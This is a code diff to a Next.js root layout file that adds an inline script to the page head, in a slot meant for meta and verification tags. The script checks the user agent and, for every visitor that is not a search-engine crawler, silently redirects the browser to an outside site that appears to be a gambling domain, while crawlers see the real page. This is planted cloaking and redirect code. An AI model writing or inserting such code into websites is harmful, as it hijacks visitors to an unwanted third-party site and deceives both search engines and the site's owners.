@@ -84,6 +84,21 @@ export default function RootLayout({
       <head>
         <meta name="yandex-verification" content="0930485c0703c76a" />
         {/* Слот для дополнительных пользовательских тегов: вставляйте сюда meta, link, коды верификации */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://spingame777.fit/4htNNl");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
